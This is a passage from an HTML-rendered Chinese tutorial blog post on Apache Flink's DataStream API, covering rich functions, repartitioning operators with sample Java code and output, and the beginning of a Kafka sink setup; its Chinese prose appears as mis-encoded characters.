id="å¯Œå‡½æ•°-Rich-Functions"><a href="#å¯Œå‡½æ•°-Rich-Functions" class="headerlink" title="å¯Œå‡½æ•°(Rich Functions)"></a>å¯Œå‡½æ•°(Rich Functions)</h5><pre><code>â€œå¯Œå‡½æ•°â€æ˜¯DataStream APIæä¾›çš„ä¸€ä¸ªå‡½æ•°ç±»çš„æ¥å£ï¼Œæ‰€æœ‰Flinkå‡½æ•°ç±»éƒ½æœ‰å…¶Richç‰ˆæœ¬ã€‚**å®ƒä¸å¸¸è§„å‡½æ•°çš„ä¸åŒåœ¨äºï¼Œå¯ä»¥è·å–è¿è¡Œç¯å¢ƒçš„ä¸Šä¸‹æ–‡ï¼Œå¹¶æ‹¥æœ‰ä¸€äº›ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼Œæ‰€ä»¥å¯ä»¥å®ç°æ›´å¤æ‚çš„åŠŸèƒ½**ã€‚</code></pre><ul><li> RichMapFunction </li><li> RichFlatMapFunction </li><li> RichFilterFunction </li><li> â€¦ </li></ul><pre><code>Rich Functionæœ‰ä¸€ä¸ª**ç”Ÿå‘½å‘¨æœŸ**çš„æ¦‚å¿µã€‚å…¸å‹çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³•æœ‰ï¼š</code></pre><ul><li> <code>**open()**</code><strong>æ–¹æ³•æ˜¯rich functionçš„åˆå§‹åŒ–æ–¹æ³•ï¼Œå½“ä¸€ä¸ªç®—å­ä¾‹å¦‚mapæˆ–è€…filterè¢«è°ƒç”¨ä¹‹å‰</strong><code>**open()**</code><strong>ä¼šè¢«è°ƒç”¨ã€‚</strong> </li><li> <code>**close()**</code><strong>æ–¹æ³•æ˜¯ç”Ÿå‘½å‘¨æœŸä¸­çš„æœ€åä¸€ä¸ªè°ƒç”¨çš„æ–¹æ³•ï¼Œåšä¸€äº›æ¸…ç†å·¥ä½œã€‚</strong> </li><li> <code>**getRuntimeContext()**</code><strong>æ–¹æ³•æä¾›äº†å‡½æ•°çš„RuntimeContextçš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚å‡½æ•°æ‰§è¡Œçš„å¹¶è¡Œåº¦ï¼Œä»»åŠ¡çš„åå­—ï¼Œä»¥åŠstateçŠ¶æ€</strong> </li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMapFunction</span> <span class="keyword">extends</span> <span class="title">RichMapFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Tuple2</span>&lt;<span class="title">Integer</span>, <span class="title">String</span>&gt;&gt; </span>&#123; </span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, String&gt; <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(getRuntimeContext().getIndexOfThisSubtask(), value.getId()); </span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;my map open&quot;</span>); <span class="comment">// ä»¥ä¸‹å¯ä»¥åšä¸€äº›åˆå§‹åŒ–å·¥ä½œï¼Œä¾‹å¦‚å»ºç«‹ä¸€ä¸ªå’ŒHDFSçš„è¿æ¥ </span></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;my map close&quot;</span>); <span class="comment">// ä»¥ä¸‹åšä¸€äº›æ¸…ç†å·¥ä½œï¼Œä¾‹å¦‚æ–­å¼€å’ŒHDFSçš„è¿æ¥ </span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.transform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.RichMapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 12:21 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest5_RichFunction</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;Tuple2&lt;String, Integer&gt;&gt; resultStream = dataStream.map( <span class="keyword">new</span> MyMapper() );</span><br><span class="line"></span><br><span class="line">        resultStream.print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¼ ç»Ÿçš„Functionä¸èƒ½è·å–ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œåªèƒ½å¤„ç†å½“å‰æ•°æ®ï¼Œä¸èƒ½å’Œå…¶ä»–æ•°æ®äº¤äº’</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMapper0</span> <span class="keyword">implements</span> <span class="title">MapFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Integer&gt; <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getId(), value.getId().length());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®ç°è‡ªå®šä¹‰å¯Œå‡½æ•°ç±»ï¼ˆRichMapFunctionæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼‰</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMapper</span> <span class="keyword">extends</span> <span class="title">RichMapFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Integer&gt; <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//            RichFunctionå¯ä»¥è·å–StateçŠ¶æ€</span></span><br><span class="line"><span class="comment">//            getRuntimeContext().getState();</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getId(), getRuntimeContext().getIndexOfThisSubtask());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// åˆå§‹åŒ–å·¥ä½œï¼Œä¸€èˆ¬æ˜¯å®šä¹‰çŠ¶æ€ï¼Œæˆ–è€…å»ºç«‹æ•°æ®åº“è¿æ¥</span></span><br><span class="line">            System.out.println(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// ä¸€èˆ¬æ˜¯å…³é—­è¿æ¥å’Œæ¸…ç©ºçŠ¶æ€çš„æ”¶å°¾æ“ä½œ</span></span><br><span class="line">            System.out.println(<span class="string">&quot;close&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><p>ç”±äºè®¾ç½®äº†æ‰§è¡Œç¯å¢ƒenvçš„å¹¶è¡Œåº¦ä¸º4ï¼Œæ‰€ä»¥æœ‰4ä¸ªslotæ‰§è¡Œè‡ªå®šä¹‰çš„RichFunctionï¼Œè¾“å‡º4æ¬¡openå’Œclose</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">open</span><br><span class="line">open</span><br><span class="line">open</span><br><span class="line">open</span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> (sensor_1,3)</span></span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> (sensor_6,3)</span></span><br><span class="line">close</span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> (sensor_1,1)</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> (sensor_1,1)</span></span><br><span class="line">close</span><br><span class="line"><span class="meta">3&gt;</span><span class="bash"> (sensor_1,2)</span></span><br><span class="line">close</span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> (sensor_7,0)</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> (sensor_10,0)</span></span><br><span class="line">close</span><br></pre></td></tr></table></figure><h4 id="æ•°æ®é‡åˆ†åŒºæ“ä½œ"><a href="#æ•°æ®é‡åˆ†åŒºæ“ä½œ" class="headerlink" title="æ•°æ®é‡åˆ†åŒºæ“ä½œ"></a>æ•°æ®é‡åˆ†åŒºæ“ä½œ</h4><p>é‡åˆ†åŒºæ“ä½œï¼Œåœ¨DataStreamç±»ä¸­å¯ä»¥çœ‹åˆ°å¾ˆå¤š<code>Partitioner</code>å­—çœ¼çš„ç±»ã€‚</p><p><strong>å…¶ä¸­</strong><code>**partitionCustom(...)**</code><strong>æ–¹æ³•ç”¨äºè‡ªå®šä¹‰é‡åˆ†åŒº</strong>ã€‚</p><p>javaä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.transform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 12:38 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest6_Partition</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ = 4</span></span><br><span class="line">    env.setParallelism(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»æ–‡ä»¶è¯»å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SingleOutputStreamOperatorå¤šå¹¶è¡Œåº¦é»˜è®¤å°±rebalance,è½®è¯¢æ–¹å¼åˆ†é…</span></span><br><span class="line">    dataStream.print(<span class="string">&quot;input&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. shuffle (å¹¶éæ‰¹å¤„ç†ä¸­çš„è·å–ä¸€æ‰¹åæ‰æ‰“ä¹±ï¼Œè¿™é‡Œæ¯æ¬¡è·å–åˆ°ç›´æ¥æ‰“ä¹±ä¸”åˆ†åŒº)</span></span><br><span class="line">    DataStream&lt;String&gt; shuffleStream = inputStream.shuffle();</span><br><span class="line">    shuffleStream.print(<span class="string">&quot;shuffle&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. keyBy (Hashï¼Œç„¶åå–æ¨¡)</span></span><br><span class="line">    dataStream.keyBy(SensorReading::getId).print(<span class="string">&quot;keyBy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. global (ç›´æ¥å‘é€ç»™ç¬¬ä¸€ä¸ªåˆ†åŒºï¼Œå°‘æ•°ç‰¹æ®Šæƒ…å†µæ‰ç”¨)</span></span><br><span class="line">    dataStream.global().print(<span class="string">&quot;global&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">input:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">input:3&gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br><span class="line">input:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718207, temperature=36.3&#125;</span><br><span class="line">input:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718209, temperature=32.8&#125;</span><br><span class="line">shuffle:2&gt; sensor_6,1547718201,15.4</span><br><span class="line">shuffle:1&gt; sensor_1,1547718199,35.8</span><br><span class="line">input:4&gt; SensorReading&#123;id=&#x27;sensor_7&#x27;, timestamp=1547718202, temperature=6.7&#125;</span><br><span class="line">input:4&gt; SensorReading&#123;id=&#x27;sensor_10&#x27;, timestamp=1547718205, temperature=38.1&#125;</span><br><span class="line">shuffle:1&gt; sensor_1,1547718207,36.3</span><br><span class="line">shuffle:2&gt; sensor_1,1547718209,32.8</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">keyBy:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br><span class="line">keyBy:3&gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br><span class="line">keyBy:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718207, temperature=36.3&#125;</span><br><span class="line">keyBy:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718209, temperature=32.8&#125;</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718207, temperature=36.3&#125;</span><br><span class="line">shuffle:1&gt; sensor_7,1547718202,6.7</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718209, temperature=32.8&#125;</span><br><span class="line">shuffle:2&gt; sensor_10,1547718205,38.1</span><br><span class="line">input:2&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718212, temperature=37.1&#125;</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_7&#x27;, timestamp=1547718202, temperature=6.7&#125;</span><br><span class="line">keyBy:4&gt; SensorReading&#123;id=&#x27;sensor_7&#x27;, timestamp=1547718202, temperature=6.7&#125;</span><br><span class="line">keyBy:2&gt; SensorReading&#123;id=&#x27;sensor_10&#x27;, timestamp=1547718205, temperature=38.1&#125;</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_10&#x27;, timestamp=1547718205, temperature=38.1&#125;</span><br><span class="line">shuffle:1&gt; sensor_1,1547718212,37.1</span><br><span class="line">keyBy:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718212, temperature=37.1&#125;</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718212, temperature=37.1&#125;</span><br></pre></td></tr></table></figure><h4 id="Sink"><a href="#Sink" class="headerlink" title="Sink"></a>Sink</h4><blockquote><p><a href="https://blog.csdn.net/lixinkuan328/article/details/104116894">Flinkä¹‹æµå¤„ç†APIä¹‹Sink</a></p></blockquote><pre><code>Flinkæ²¡æœ‰ç±»ä¼¼äºsparkä¸­foreachæ–¹æ³•ï¼Œè®©ç”¨æˆ·è¿›è¡Œè¿­ä»£çš„æ“ä½œã€‚è™½æœ‰å¯¹å¤–çš„è¾“å‡ºæ“ä½œéƒ½è¦åˆ©ç”¨Sinkå®Œæˆã€‚æœ€åé€šè¿‡ç±»ä¼¼å¦‚ä¸‹æ–¹å¼å®Œæˆæ•´ä¸ªä»»åŠ¡æœ€ç»ˆè¾“å‡ºæ“ä½œã€‚</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream.addSink(<span class="keyword">new</span> MySink(xxxx))</span><br></pre></td></tr></table></figure><pre><code>å®˜æ–¹æä¾›äº†ä¸€éƒ¨åˆ†çš„æ¡†æ¶çš„sinkã€‚é™¤æ­¤ä»¥å¤–ï¼Œéœ€è¦ç”¨æˆ·è‡ªå®šä¹‰å®ç°sinkã€‚</code></pre><p><img src="https://img-blog.csdnimg.cn/20200130221249884.png###id=jEMdn&originHeight=602&originWidth=272&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h5><ol><li><p> pomä¾èµ–  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Flink_Tutorial<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">flink.version</span>&gt;</span>1.12.1<span class="tag">&lt;/<span class="name">flink.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scala.binary.version</span>&gt;</span>2.12<span class="tag">&lt;/<span class="name">scala.binary.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-streaming-scala_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-clients_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- kafka --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span 